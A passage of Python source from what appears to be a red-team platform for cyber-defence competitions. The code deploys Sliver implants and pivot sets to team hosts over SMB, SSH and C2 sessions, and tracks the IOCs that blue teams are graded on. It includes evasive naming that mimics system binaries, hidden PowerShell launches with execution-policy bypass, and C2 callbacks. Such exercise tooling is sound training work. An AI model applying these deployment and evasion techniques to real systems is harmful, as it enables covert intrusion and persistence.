                None,
            )
            if match is not None:
                if persistence_name:
                    match.persistence_mechanism = persistence_name
                if implant_identifier:
                    match.implant_identifier = implant_identifier
                if deploy_params:
                    match.set_params({**match.params_dict, **deploy_params})
                return match.id, True

            # Resolve IOC OS + difficulty for the label.  Look up via the
            # orchestrator's loader; fall back to LINUX/MEDIUM defaults.
            try:
                from fastapi_backend.utils.dependencies import (
                    get_orchestrator,  # cycle-break
                )
                _orch = get_orchestrator()
                ioc_def = _orch.ioc_loader.ioc_definitions.get(ioc_name)
            except Exception:
                ioc_def = None
            ioc_os = (ioc_def.os if ioc_def else "linux").lower()
            # Generate-page auto-difficulty (docs/PLAN_generate_page_labels_
            # autodifficulty.md) overrides the IOC's static difficulty on the
            # INSERT path only; existing rows keep their scored difficulty (blue
            # teams are graded on the number that was in place when the row was
            # first written).
            ioc_diff = (
                computed_difficulty
                if computed_difficulty is not None
                else (ioc_def.difficulty if ioc_def else 2)
            )
            label = assign_blue_team_label(db, ioc_os, ioc_diff)
            row = DeployedIOCs(
                box_ip=box_ip,
                ioc_name=ioc_name,
                persistence_mechanism=persistence_name,
                implant_identifier=implant_identifier,
                blue_team_label=label,
                deployed_at=dt.datetime.now(dt.UTC),
                deployed_by=deployed_by,
                status="active",
                source="auto",  # required for kill-tracking (_handle_implant_disconnect flips only source='auto')
                difficulty=ioc_diff,
            )
            if deploy_params:
                row.set_params(deploy_params)
            db.add(row)
            db.flush()
            return row.id, False

        row_id, reused = await write_actor.submit(_register, label="auto_register_deployed_ioc")
        if reused:
            logger.info(
                "auto-register: reused active DeployedIOCs id=%d for %s on %s (dir=%s)",
                row_id, ioc_name, box_ip, new_dir or "-",
            )
        return row_id
    except Exception as exc:
        logger.warning("auto-register DeployedIOCs failed for %s: %s", box_ip, exc)
        return None


def _resolve_ioc_difficulty(ioc_name: str | None) -> int | None:
    """Best-effort IOC difficulty (1-4) for deploy-dir tier selection.

    Returns None (whole-pool selection) when the name is absent or the IOC
    can't be resolved — e.g. an ad-hoc operator generate not tied to an IOC.
    """
    if not ioc_name:
        return None
    try:
        from fastapi_backend.utils.dependencies import get_orchestrator  # cycle-break
        ioc_def = get_orchestrator().ioc_loader.ioc_definitions.get(ioc_name)
        return ioc_def.difficulty if ioc_def else None
    except Exception:
        return None


def _resolve_ioc_flag(ioc_name: str | None, attr: str, *, default: bool = False) -> bool:
    """Best-effort boolean IOC-definition flag (e.g. ``timestomp``, ``backup_copy``).

    Paths that deploy an implant without an ``ImplantGenerateRequest`` body (the
    pivot-set path) have no operator override to read, so the IOC definition is
    the only source for these flags.
    """
    if not ioc_name:
        return default
    try:
        from fastapi_backend.utils.dependencies import get_orchestrator  # cycle-break
        ioc_def = get_orchestrator().ioc_loader.ioc_definitions.get(ioc_name)
        return bool(getattr(ioc_def, attr, default)) if ioc_def else default
    except Exception:
        return default


def _name_uniquifier(difficulty: int | None) -> str:
    """On-target-name ``_<8hex>`` uniquifier, or ``''`` to suppress it.

    Suppressed for IOCs harder than Easy (difficulty > 1) so the deployed
    filename stays pristine (``cron``, ``periodic``, ``svchost.exe``) and blends
    into real system binaries — the whole point of the higher tiers. Easy
    (difficulty == 1) and back-compat callers that pass no difficulty
    (``None`` — raw non-IOC implant deploys) keep the suffix, which sidesteps
    ETXTBSY / stale-artifact collisions when the same build+name is redeployed
    while a prior copy is still running.

    Scrub coverage is preserved when the suffix is dropped: a suppressed
    implant still matches ``implant_scrub`` via the pooled-name arm (pooled
    names inside a pool dir) or the ``beacon|session|_<os>_amd64`` build-name
    arm; only the ``_[0-9a-f]{8}`` arm is forfeited, which those callers never
    relied on.
    """
    if difficulty is not None and difficulty > 1:
        return ""
    return f"_{uuid.uuid4().hex[:8]}"


async def _deploy_one_implant(
    nxc: object,
    local_path: Path,
    fname: str,
    host: str,
    username: str,
    password: str,
    is_windows: bool,
    goos: str = "linux",
    avoid_tmpfs: bool = False,
    difficulty: int | None = None,
    shared_lib_loader: Path | None = None,
) -> dict:
    """Deploy a binary to one host via NXC. Returns {"host", "success", "error", "path"}. Never raises.

    shared_lib_loader: for Sliver ``.so`` shared-lib implants (FreeBSD/Linux) —
    the ``local_path`` binary is a ``.so`` that is NOT itself executable, so a
    native C loader binary (``so_loader_{goos}``) is deployed alongside it and
    launched as ``<loader> <so> RunSliver`` (FreeBSD via ``daemon -f``, Linux
    backgrounded). Both files land inside the same FreeBSD ``mount -uw`` window.
    When set (non-Windows only), the returned dict also carries ``loader_dest``
    (the on-target loader path) so the caller can timestomp it. ``None`` = the
    normal path where ``local_path`` is itself the executable implant.

    Rotates across the OS deploy-path pool: a single directory can fail the
    write with EACCES / ETXTBSY / EROFS on a given box, so each candidate is
    tried in turn until put_file succeeds.  The destination filename carries a
    random token so a still-running prior binary of the same build can't trigger
    ETXTBSY ("Text file busy").

    difficulty: IOC difficulty (1-4) — higher difficulty draws from less-obvious
    deploy dirs (docs/PLAN_difficulty_pools_extensionless.md). None = whole pool.

    avoid_tmpfs: set by callers that will apply immutability (chattr +i)
    afterward — tmpfs doesn't support the immutable attribute. /dev/shm is
    excluded from the candidate pool outright (always tmpfs); /tmp and other
    distro-inconsistent candidates (tmpfs on some boxes via systemd's
    tmp.mount, real disk on others) are runtime-probed per candidate below
    rather than assumed, since that varies per box.
    """
    from fastapi_backend.c2.deploy_paths import deploy_path_candidates  # cycle-break

    os_name = "windows" if is_windows else goos
    protocol = "smb" if is_windows else "ssh"
    is_freebsd = (not is_windows) and goos == "freebsd"

    # Unique destination filename — the build's filename is reused across
    # deploys, so a fixed name collides with the prior still-running binary
    # (ETXTBSY) and any stale on-disk artefact. A random token sidesteps both.
    _stem, _dot, _ext = fname.rpartition(".")
    _uniq = _name_uniquifier(difficulty)
    if is_windows:
        dest_fname = f"{_stem}{_uniq}.{_ext}" if _dot else f"{fname}{_uniq}"
    else:
        # Linux/FreeBSD: real binaries carry no extension — strip the .elf on the
        # ON-TARGET name (the local ./implants/<uuid>/ artifact keeps it). scrub
        # matches by ELF magic + implant-name pattern, not the extension
        # (docs/PLAN_difficulty_pools_extensionless.md). The _<8hex> uniquifier
        # is part of the name signal scrub keys on for Easy/back-compat deploys;
        # harder tiers drop it (pristine name) and rely on the pooled-name /
        # build-name scrub arms instead — see _name_uniquifier.
        _base = _stem if _dot else fname
        dest_fname = f"{_base}{_uniq}"

    candidates = deploy_path_candidates(os_name, difficulty=difficulty, avoid_tmpfs=avoid_tmpfs)
    last_error = "no deploy path candidates"
    tried: list[str] = []

    for deploy_dir in candidates:
        tried.append(deploy_dir)
        if avoid_tmpfs and not is_windows:
            try:
                fs_probe = await nxc.execute(host, protocol, username, password,  # nxc-wrapper-bypass: binary-deploy
                                             f"stat -f -c %T '{deploy_dir}' 2>/dev/null",
                                             powershell=False, exec_method=None)
                if fs_probe.success and "tmpfs" in (fs_probe.output or "").lower():
                    last_error = f"{deploy_dir} is tmpfs (immutability requested)"
                    logger.info("_deploy_one_implant: skipping tmpfs candidate %s on %s (avoid_tmpfs)",
                                deploy_dir, host)
                    continue
            except Exception as exc:
                # Probe failure isn't a reason to give up on an otherwise-viable
                # candidate — fall through and let the real write attempt decide.
                logger.warning("_deploy_one_implant: tmpfs probe failed for %s on %s (%s); trying anyway",
                               deploy_dir, host, exc)
        if is_windows:
            # SMB --put-file expects a path relative to the C$ share (no drive letter).
            # Strip the drive letter prefix (e.g. "C:\Windows\Temp" → "\Windows\Temp").
            share_path = deploy_dir.lstrip("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz").lstrip(":")
            put_path = f"{share_path}\\{dest_fname}"
            exec_path = f"{deploy_dir}\\{dest_fname}"
        else:
            put_path = f"{deploy_dir}/{dest_fname}"
            exec_path = put_path
        try:
            # pfSense/FreeBSD root ZFS may be RO after a prior script run; the
            # deploy dir (e.g. /usr/local/bin) lives on it, so put_file + chmod
            # fail with EROFS. Remount root rw defensively before upload + launch.
            if is_freebsd:
                await nxc.execute(host, protocol, username, password, "/sbin/mount -uw /",  # nxc-wrapper-bypass: binary-deploy
                                  powershell=False, exec_method=None)
            # Linux/BSD preflight: if <deploy_dir>/<dest_fname> already exists
            # as a DIRECTORY, put_file's `cp <src> <existing-dir>` semantics
            # deposit the file INSIDE the dir (not AS it), giving downstream
            # steps (dlopen, persistence, check-script stat) an unfindable
            # artifact. Rotate to a different candidate instead. Live-observed
            # 2026-09-11 on polus (Ubuntu 20.04) where filename `snapd` matched
            # `/var/lib/snapd` (real snapd package dir). See
            # project_pool_dir_collision. Windows uses SMB share paths and
            # doesn't share this failure mode currently — skip probe there.
            if not is_windows:
                try:
                    probe = await nxc.execute(  # nxc-wrapper-bypass: dir-collision preflight
                        host, protocol, username, password,
                        f"test -d '{put_path}' && echo IS_DIR || echo OK",
                        powershell=False, exec_method=None,
                    )
                except Exception:
                    probe = None
                if probe is not None and getattr(probe, "success", False) and \
                        "IS_DIR" in (getattr(probe, "output", "") or ""):
                    last_error = (
                        f"{put_path} exists as a directory on target — "
                        f"rotating to avoid cp-into-dir collision"
                    )
                    logger.warning(
                        "_deploy_one_implant: %s is a dir on %s; rotating candidate",
                        put_path, host,
                    )
                    continue
            put_result = await nxc.put_file(host, protocol, username, password, str(local_path), put_path)  # nxc-wrapper-bypass: binary-deploy
            if not put_result.success:
                # EACCES/ETXTBSY/EROFS on this dir — rotate to the next candidate.
                last_error = put_result.error
                logger.warning("_deploy_one_implant: put_file failed at %s on %s (%s); rotating",
                               deploy_dir, host, put_result.error)
                continue

            # Shared-lib implant (FreeBSD/Linux): the .so isn't executable, so
            # drop the native loader beside it (SAME dir → SAME FreeBSD mount
            # window) and launch the LOADER, which dlopen()s the .so and calls
            # RunSliver. Loader put failure rotates like a .so put failure.
            loader_dest: str | None = None
            pgrep_name = dest_fname
            if shared_lib_loader is not None and not is_windows:
                # Same difficulty gate as the implant name: harder-than-Easy tiers
                # get a pristine ``so_loader_<goos>`` (no _<8hex> tail). scrub
                # anchors on the ``so_loader`` prefix in _NIX_NAME_BODY, so the
                # loader is still matched with or without the uniquifier.
                loader_dest = f"{deploy_dir}/{shared_lib_loader.name}{_uniq}"
                ldr_put = await nxc.put_file(host, protocol, username, password,  # nxc-wrapper-bypass: binary-deploy
                                             str(shared_lib_loader), loader_dest)
                if not ldr_put.success:
                    last_error = f"loader put_file failed at {deploy_dir}: {ldr_put.error}"
                    logger.warning("_deploy_one_implant: loader put_file failed at %s on %s (%s); rotating",
                                   deploy_dir, host, ldr_put.error)
                    continue
                pgrep_name = loader_dest.rsplit("/", 1)[-1]  # loader is the running proc, not the .so

            if is_windows:
                cmd = f"Start-Process -FilePath '{exec_path}' -WindowStyle Hidden"
                exec_result = await nxc.execute(host, protocol, username, password, cmd,  # nxc-wrapper-bypass: binary-deploy
                                                powershell=True, exec_method="smbexec",
                                                sweep_after=True)
            elif goos == "freebsd":
                # FreeBSD: daemon(8) properly detaches the process from the terminal.
                # Subshell & backgrounding doesn't fully detach on pfSense/dropbear SSH.
                # daemon -f exits 0 even when the child crashes immediately (SIGSEGV, OOM,
                # etc.) — verify the process is actually running and retry up to 2 more times.
                if loader_dest is not None:
                    cmd = f"chmod +x {loader_dest} && daemon -f {loader_dest} {exec_path} RunSliver"
                else:
                    cmd = f"chmod +x {exec_path} && daemon -f {exec_path}"
                exec_result = await nxc.execute(host, protocol, username, password, cmd,  # nxc-wrapper-bypass: binary-deploy
                                                powershell=False, exec_method=None)
                for _attempt in range(3):
                    if not exec_result.success:
                        break  # NXC itself failed; no point pgrep-checking
                    await asyncio.sleep(2)
                    verify = await nxc.execute(  # nxc-wrapper-bypass: binary-deploy
                        host, protocol, username, password,
                        f"pgrep -f '{pgrep_name}' >/dev/null 2>&1 && echo RUNNING || echo DEAD",
                        powershell=False, exec_method=None,
                    )
                    if verify.success and "RUNNING" in verify.output:
                        break
                    if _attempt < 2:
                        logger.warning(
                            "_deploy_one_implant: FreeBSD process not found after launch "
                            "(attempt %d/3), retrying daemon -f: %s on %s",
                            _attempt + 1, pgrep_name, host,
                        )
                        exec_result = await nxc.execute(host, protocol, username, password,  # nxc-wrapper-bypass: binary-deploy
                                                        cmd, powershell=False, exec_method=None)
            else:
                if loader_dest is not None:
                    cmd = (f"chmod +x {loader_dest} && "
                           f"({loader_dest} {exec_path} RunSliver </dev/null >/dev/null 2>&1 &)")
                else:
                    cmd = f"chmod +x {exec_path} && ({exec_path} </dev/null >/dev/null 2>&1 &)"
                exec_result = await nxc.execute(host, protocol, username, password, cmd,  # nxc-wrapper-bypass: binary-deploy
                                                powershell=False, exec_method=None)
            # put succeeded — the binary landed here; an exec failure is a
            # different problem (don't keep rotating paths for it).  Return
            # dest_fname (the actual on-disk name, uniquified above) — NOT
            # the caller's original fname — so callers that reconstruct the
            # full remote path (e.g. for $C3R_BINARY) point at the real file.
            _ret = {"host": host, "success": exec_result.success, "error": exec_result.error,
                    "path": deploy_dir, "filename": dest_fname}
            if loader_dest is not None:
                _ret["loader_dest"] = loader_dest  # for post-deploy timestomp (plan Part E/I)
            return _ret
        except Exception as exc:
            last_error = str(exc)
            logger.warning("_deploy_one_implant: exception at %s on %s (%s); rotating", deploy_dir, host, exc)
            continue

    # Every SMB drop-dir candidate failed. When the failures look transient
    # (NETBIOS timeout class) and this is a Windows box, escalate the file push
    # to WinRM -> SSH before giving up (docs/PLAN_windows_delivery_fallback.md).
    if is_windows and config.NXC_ALT_DELIVERY_ENABLED:
        from fastapi_backend.netexec.alt_delivery import try_alt_delivery  # cycle-break
        from fastapi_backend.netexec.wrapper import _TRANSIENT_PUT_RE  # cycle-break
        if _TRANSIENT_PUT_RE.search(last_error or ""):
            alt_deployed = await _alt_deliver_and_launch(
                nxc, local_path, dest_fname, host, username, password, candidates, try_alt_delivery,
            )
            if alt_deployed is not None:
                return alt_deployed

    return {"host": host, "success": False,
            "error": f"all {len(tried)} deploy path(s) failed [{', '.join(tried)}]: {last_error}",
            "path": tried[-1] if tried else None, "filename": None}


async def _alt_deliver_and_launch(
    nxc: object,
    local_path: Path,
    dest_fname: str,
    host: str,
    username: str,
    password: str,
    candidates: list[str],
    try_alt_delivery: object,
) -> dict | None:
    """WinRM/SSH fallback push for a Windows implant after SMB rotation failed.

    Tries each candidate dir via the alternate-delivery tiers; on the first one
    that lands the binary, runs the same hidden-exec the SMB path uses and
    returns the deploy dict (with delivery_method). Returns None if no tier
    delivered to any candidate. Opens its own short-lived session for the SSH
    port lookup (safe under asyncio.gather — no shared caller session).
    """
    for deploy_dir in candidates:
        exec_path = f"{deploy_dir}\\{dest_fname}"
        with Session(engine) as _db:
            alt = await try_alt_delivery(  # type: ignore[operator]
                nxc, host, "windows", username, password, None,
                local_path, exec_path, _db,
            )
        if not (alt and alt[0].success):
            continue
        method = alt[1]
        cmd = f"Start-Process -FilePath '{exec_path}' -WindowStyle Hidden"
        exec_result = await nxc.execute(host, "smb", username, password, cmd,  # nxc-wrapper-bypass: binary-deploy
                                        powershell=True, exec_method="smbexec", sweep_after=True)
        logger.info("_deploy_one_implant: delivered %s to %s via %s (SMB fallback)",
                    dest_fname, host, method)
        return {"host": host, "success": exec_result.success, "error": exec_result.error,
                "path": deploy_dir, "filename": dest_fname, "delivery_method": method}
    return None


async def _deploy_one_implant_via_session(
    interact: Any,
    binary_data: bytes,
    fname: str,
    box_ip: str,
    is_windows: bool,
    method: str,
    goos: str = "linux",
    difficulty: int | None = None,
) -> dict:
    """Deploy a binary to one host via an existing Sliver session/beacon.

    Mirrors _deploy_one_implant's per-OS launch logic (path rotation, Windows
    hidden Start-Process, FreeBSD daemon -f + pgrep-verify + rw/ro remount,
    generic Linux backgrounded subshell) but issues every step through
    interact.upload/interact.execute instead of nxc.put_file/nxc.execute.
    Preferred over NXC when a live session/beacon already exists on the box —
    see docs/PLAN_operator_ux.md § C.
    """
    from fastapi_backend.c2.deploy_paths import deploy_path_candidates  # cycle-break
    from fastapi_backend.c2.sliver_shell_dispatch import _check_err  # cycle-break

    os_name = "windows" if is_windows else goos
    is_freebsd = (not is_windows) and goos == "freebsd"

    # sliver-py's beacon methods (upload/execute) return an asyncio.Future that
    # resolves only when the beacon-taskresult event arrives on the beacon's
    # NEXT check-in (typically 60s later). A bare `await interact.upload(...)`
    # returns the Future itself, not the completed Upload — so this function
    # would report success before the file actually existed on the target, and
    # the persistence-apply step that runs immediately afterward would fail with
    # "Implant binary not found at <path> — upload it first". Live-reproduced
    # today on linux_implant_hidden_systemd / linux_implant_obvious_systemd:
    # deploy path returned success + delivery_method=beacon + persistence_applied=false.
    # Session interact methods return the result directly, so beacon is the only
    # method that needs the extra await.
    async def _await_step(result: Any, step_label: str) -> Any:
        if method != "beacon":
            return result
        if not asyncio.isfuture(result):
            return result
        # Cap at 3× the default 60s beacon interval so a wedged beacon fails
        # the step (and rotates deploy paths) rather than hanging the fanout.
        try:
            return await asyncio.wait_for(result, timeout=180)
        except asyncio.TimeoutError as exc:
            raise RuntimeError(
                f"beacon {step_label} timed out after 180s waiting for check-in"
            ) from exc
    _stem, _dot, _ext = fname.rpartition(".")
    _uniq = _name_uniquifier(difficulty)
    if is_windows:
        dest_fname = f"{_stem}{_uniq}.{_ext}" if _dot else f"{fname}{_uniq}"
    else:
        # Linux/FreeBSD: extensionless on-target name (see _deploy_one_implant).
        # Harder-than-Easy tiers drop the _<8hex> uniquifier for a pristine name.
        _base = _stem if _dot else fname
        dest_fname = f"{_base}{_uniq}"

    candidates = deploy_path_candidates(os_name, difficulty=difficulty)
    last_error = "no deploy path candidates"
    tried: list[str] = []

    for deploy_dir in candidates:
        tried.append(deploy_dir)
        exec_path = f"{deploy_dir}\\{dest_fname}" if is_windows else f"{deploy_dir}/{dest_fname}"
        try:
            if is_freebsd:
                await _await_step(
                    await interact.execute("/sbin/mount", ["-uw", "/"], output=True),
                    "mount -uw /",
                )
            upload_result = await _await_step(
                await interact.upload(exec_path, data=binary_data),
                f"upload {exec_path}",
            )
            upload_err = _check_err(upload_result)
            if upload_err:
                last_error = upload_err
                logger.warning("_deploy_one_implant_via_session: upload failed at %s on %s (%s); rotating",
                               deploy_dir, box_ip, upload_err)
                continue

            if is_windows:
                launch_result = await _await_step(
                    await interact.execute(
                        "powershell.exe",
                        ["-WindowStyle", "Hidden", "-Command", f"Start-Process -FilePath '{exec_path}'"],
                        output=False,
                    ),
                    "Start-Process",
                )
            elif goos == "freebsd":
                await _await_step(
                    await interact.execute("chmod", ["+x", exec_path], output=True),
                    f"chmod +x {exec_path}",
                )
                launch_result = await _await_step(
                    await interact.execute("daemon", ["-f", exec_path], output=True),
                    f"daemon -f {exec_path}",
                )
                for _attempt in range(3):
                    await asyncio.sleep(2)
                    verify = await _await_step(
                        await interact.execute(
                            "sh", ["-c", f"pgrep -f '{dest_fname}' >/dev/null 2>&1 && echo RUNNING || echo DEAD"],
                            output=True,
                        ),
                        f"pgrep {dest_fname}",
                    )
                    if b"RUNNING" in (getattr(verify, "Stdout", b"") or b""):
                        break
                    if _attempt < 2:
                        logger.warning(
                            "_deploy_one_implant_via_session: FreeBSD process not found after launch "
                            "(attempt %d/3), retrying daemon -f: %s on %s",
                            _attempt + 1, dest_fname, box_ip,
                        )
                        launch_result = await _await_step(
                            await interact.execute("daemon", ["-f", exec_path], output=True),
                            f"daemon -f {exec_path} retry",
                        )
            else:
                await _await_step(
                    await interact.execute("chmod", ["+x", exec_path], output=True),
                    f"chmod +x {exec_path}",
                )
                launch_result = await _await_step(
                    await interact.execute(
                        "sh", ["-c", f"nohup {exec_path} </dev/null >/dev/null 2>&1 &"], output=False,
                    ),
                    f"nohup {exec_path}",
                )

            launch_err = _check_err(launch_result)
            return {"host": box_ip, "success": launch_err is None, "error": launch_err,
                    "path": deploy_dir, "filename": dest_fname, "delivery_method": method}
        except Exception as exc:
            last_error = str(exc)
            logger.warning("_deploy_one_implant_via_session: exception at %s on %s (%s); rotating",
                            deploy_dir, box_ip, exc)
            continue

    return {"host": box_ip, "success": False,
            "error": f"all {len(tried)} deploy path(s) failed [{', '.join(tried)}]: {last_error}",
            "path": tried[-1] if tried else None, "filename": None, "delivery_method": method}


async def _generate_pivot_set(
    body: ImplantGenerateRequest, actor_username: str = "system", task_id: int | None = None
) -> JSONResponse:
    """Generate a coordinated 3-implant set per selected team for pivot mode.

    Per team:
      Implant 1: pfSense mTLS session (freebsd/amd64, ELF, session)
      Implant 2: Windows TCP-pivot (windows/amd64, EXE, operator-chosen type)
      Implant 3: Linux TCP-pivot (linux/amd64, ELF, operator-chosen type)
    """
    try:
        return await _generate_pivot_set_inner(body, actor_username=actor_username, task_id=task_id)
    except HTTPException:
        raise
    except grpc.aio.AioRpcError as exc:
        raise HTTPException(status_code=503, detail=f"Sliver gRPC error during pivot generate: {exc.details()}") from None
    except Exception as exc:
        # Without explicit logging here the route returns a generic ASGI 500
        # with no breadcrumb in the backend log — Starlette's default 500 path
        # writes to uvicorn.error which is not always wired into the file
        # handler. Log the full traceback so test failures are diagnosable.
        logger.exception("_generate_pivot_set failed: %s", exc)
        raise HTTPException(status_code=500, detail=f"pivot generate failed: {exc!r}") from exc


async def _bg_generate_pivot_set(
    task_id: int, body: ImplantGenerateRequest, actor_username: str
) -> None:
    """Background half of the pivot-set branch of ``POST /c2/implants/generate``.

    Unwraps :func:`_generate_pivot_set`'s ``JSONResponse`` onto the task's
    ``metadata_json`` so pollers get exactly what the old synchronous 200 returned
    (``pivot_set_id``, ``builds``, per-build ``deploy_results``).
    """
    start_task(task_id)
    try:
        resp = await _generate_pivot_set(body, actor_username=actor_username, task_id=task_id)
        payload = json.loads(bytes(resp.body).decode("utf-8"))
        update_task_metadata(task_id, payload)
        finish_task(task_id, "done")
    except HTTPException as exc:
        logger.error("_bg_generate_pivot_set task=%d: %s", task_id, exc.detail)
        update_task_metadata(task_id, {"error": str(exc.detail), "status_code": exc.status_code})
        finish_task(task_id, "failed")
    except Exception as exc:
        logger.error("_bg_generate_pivot_set task=%d: unexpected error: %s", task_id, exc, exc_info=True)
        update_task_metadata(task_id, {"error": str(exc)})
        finish_task(task_id, "failed")


async def _generate_pivot_set_inner(
    body: ImplantGenerateRequest, actor_username: str = "system", task_id: int | None = None
) -> JSONResponse:
    from fastapi_backend.utils.dependencies import get_orchestrator  # cycle-break

    client = _get_sliver_client()
    nxc = _get_nxc_wrapper()

    orchestrator = get_orchestrator()

    all_sets = []
    for team_num in body.pivot_team_nums:
        fw_box = next(
            (b for b in orchestrator.inventory_manager.all_boxes
             if b.team_num == team_num and b.os == "firewall"),
            None,
        )
        if fw_box is None:
            raise HTTPException(status_code=400, detail=f"No firewall box found for team {team_num}")

        pivot_set_id = str(uuid.uuid4())

        # Resolve port: caller override wins, else per-team allocation so
        # concurrent pivots from different teams don't fight for 127.0.0.1:9898.
        effective_pivot_port = (
            body.tcp_pivot_port
            if body.tcp_pivot_port is not None
            else config.PIVOT_LISTENER_PORT_BASE + team_num
        )

        with Session(engine) as db:
            win_ips = [b.box_ip for b in db.execute(
                select(Boxes).where(Boxes.team_num == team_num, Boxes.os == "windows")
            ).scalars().all()]
            lin_ips = [b.box_ip for b in db.execute(
                select(Boxes).where(Boxes.team_num == team_num, Boxes.os == "linux")
            ).scalars().all()]

        builds = []
        # Generate sequentially — Go compile is ~5 min each; parallel risks OOM.
        # PLAN Phase 2b: each _generate_single_implant runs with a READ-ONLY
        # Session for its dedup lookup, then RETURNS pending_writes; the write
        # actor commits AFTER the compile+deploy await block, so SQLite's write
        # lock is never held across the Go compile.
        pfsense_url = body.c2_url
        with Session(engine) as db:
            build1 = await _generate_single_implant(
                client=client, nxc=nxc,
                task_id=task_id,
                goos="freebsd", goarch="amd64", fmt_str="exe",
                is_beacon=False, beacon_interval=60,
                c2_url=pfsense_url,
                deploy_ips=[fw_box.ip],
                db_session=db,
                pivot_gateway=True,
                pivot_set_id=pivot_set_id,
                tcp_pivot_port=effective_pivot_port,
                fallback_creds={fw_box.ip: (fw_box.username, fw_box.password)},
            )
        _pw = build1.pop("pending_writes", None) if isinstance(build1, dict) else None

        if _pw:

            await write_actor.submit(

                lambda adb, _p=_pw: _apply_generate_pending_writes(adb, _p),

                label="pivot_gateway_persist",

            )
        builds.append(build1)

        pivot_url = f"tcppivot://{fw_box.ip}:{effective_pivot_port}"
        with Session(engine) as db:
            build2 = await _generate_single_implant(
                client=client, nxc=nxc,
                task_id=task_id,
                goos="windows", goarch="amd64", fmt_str=body.format,
                is_beacon=body.is_beacon, beacon_interval=body.beacon_interval,
                c2_url=pivot_url,
                deploy_ips=win_ips,
                db_session=db,
                pivot_gateway=False,
                pivot_set_id=pivot_set_id,
                tcp_pivot_port=None,
                persistence_tier_group=body.persistence_tier_group,
                persistence_name=body.persistence_tier_group,
                apply_immutable=body.apply_immutable,
                immutable_scope=body.immutable_scope,
                auto_register=body.auto_register,
                auto_register_ioc_name=body.auto_register_ioc_name,
                actor_username=actor_username,
                computed_difficulty=body.computed_difficulty,
            )
        _pw = build2.pop("pending_writes", None) if isinstance(build2, dict) else None

        if _pw:

            await write_actor.submit(

                lambda adb, _p=_pw: _apply_generate_pending_writes(adb, _p),

                label="pivot_windows_persist",

            )
        builds.append(build2)

        with Session(engine) as db:
            build3 = await _generate_single_implant(
                client=client, nxc=nxc,
                task_id=task_id,
                goos="linux", goarch="amd64", fmt_str="exe",
                is_beacon=body.is_beacon, beacon_interval=body.beacon_interval,
                c2_url=pivot_url,
                deploy_ips=lin_ips,
                db_session=db,
                pivot_gateway=False,
                pivot_set_id=pivot_set_id,
                tcp_pivot_port=None,
                persistence_tier_group=body.persistence_tier_group,
                persistence_name=body.persistence_tier_group,
                apply_immutable=body.apply_immutable,
                immutable_scope=body.immutable_scope,
                auto_register=body.auto_register,
                auto_register_ioc_name=body.auto_register_ioc_name,
                actor_username=actor_username,
                computed_difficulty=body.computed_difficulty,
            )
        _pw = build3.pop("pending_writes", None) if isinstance(build3, dict) else None

        if _pw:

            await write_actor.submit(

                lambda adb, _p=_pw: _apply_generate_pending_writes(adb, _p),

                label="pivot_linux_persist",

            )
        builds.append(build3)

        all_sets.append({"team_num": team_num, "pivot_set_id": pivot_set_id, "builds": builds})

    # Flatten for backward-compat response shape when single team selected
    if len(all_sets) == 1:
        return JSONResponse(all_sets[0])
    return JSONResponse({"sets": all_sets})


async def _deploy_ps_via_file(
    nxc: Any,
    win_ip: str,
    cred: Any,
    script_rel_path: str,
    env: dict[str, str],
    *,
    db: Session | None = None,
) -> tuple[bool, int | None, str]:
    """Deliver a Windows PS1 deploy script via put_file + ``powershell.exe -File``.

    Returns ``(ok, status, output)``.

    Replaces the ``build_inline_command(...) + execute_cred(powershell=True)``
    delivery for the pivot Windows persistence steps. That pattern re-encodes the
    already-complete ``powershell.exe -EncodedCommand`` string a second time
    through nxc's ``-X`` (UTF-16LE+base64, ~2.67x); both pivot scripts sit near
    the 8191-char cap single-encoded (svc=8159, wmi=8071), so doubled they exceed
    it — nxc prints "Command exceeds maximum length of 8191" and exits rc=0, and
    the script never runs while the caller reads success. See
    ``script_wrapper.render_windows_ps_body`` for the full write-up.

    ``ok`` is True only when nxc ran the file AND the script reported
    ``{"status":1}``. Both pivot scripts always ``exit 0`` (even the caught-error
    branch emits ``{"status":-1}``), so rc alone lies — the JSON status is the
    real verdict.
    """
    from fastapi_backend.netexec.check_runner import _parse_check_output  # cycle-break
    from fastapi_backend.netexec.script_wrapper import (
        render_windows_ps_body,  # cycle-break
    )

    body = render_windows_ps_body(script_rel_path, env)
    remote_name = f"c3r_{uuid.uuid4().hex[:12]}.ps1"
    remote_rel = rf"\Windows\Temp\{remote_name}"   # SMB put_file: C$-share-relative
    remote_abs = rf"C:\Windows\Temp\{remote_name}"
    with tempfile.NamedTemporaryFile("w", suffix=".ps1", delete=False, encoding="utf-8") as tmp:
        tmp.write(body)
        tmp_path = tmp.name
    try:
        put = await nxc.put_file_cred(  # nxc-wrapper-bypass: script-file deploy (size-independent)
            win_ip, "smb", cred, tmp_path, remote_rel, db=db,
        )
        if not put.success:
            return False, None, f"put_file {remote_name}: {put.output}"
        res = await nxc.execute_cred(  # nxc-wrapper-bypass: put-file + -File delivery
            win_ip, "smb", cred,
            f"powershell.exe -NoProfile -ExecutionPolicy Bypass -File {remote_abs}",
            powershell=False,
        )
        with contextlib.suppress(Exception):
            await nxc.execute_cred(  # nxc-wrapper-bypass: temp-file cleanup
                win_ip, "smb", cred, f"cmd.exe /c del {remote_abs}", powershell=False,
            )
    finally:
        Path(tmp_path).unlink(missing_ok=True)
    out = str(res.output or "")
    status = _parse_check_output(out).get("status")
    return (bool(res.success) and status == 1), status, out


async def _generate_pivot_ioc_set(
    task_id: int,
    gateway_ioc: Any,
    linux_ioc: Any | None,
    windows_ioc: Any | None,
    team_nums: list[int],
    actor_username: str = "system",
) -> None:
    """Deploy the devd_kqueue pivot set derived from IOC definitions.

    Sister function to _generate_pivot_set_inner — derives compile params from
    each IOC's ImplantSpec rather than an ImplantGenerateRequest body.
    Writes per-box progress to task_id so deploy_all._record can derive status.
    """
    from fastapi_backend.utils.dependencies import get_orchestrator  # lazy-load

    client = _get_sliver_client()
    nxc    = _get_nxc_wrapper()
    orchestrator = get_orchestrator()

    gw_spec  = gateway_ioc.implant_spec
    lin_spec = linux_ioc.implant_spec  if linux_ioc  else None
    win_spec = windows_ioc.implant_spec if windows_ioc else None

    host     = config.C2_IP or config.SLIVER_HOST
    mtls_url = f"mtls://{host}:{config.MTLS_LISTENER_PORT}"

    for team_num in team_nums:
        fw_box = next(
            (b for b in orchestrator.inventory_manager.all_boxes
             if b.team_num == team_num and b.os == "firewall"),
            None,
        )
        if fw_box is None:
            logger.warning("_generate_pivot_ioc_set: no firewall box for team %d", team_num)
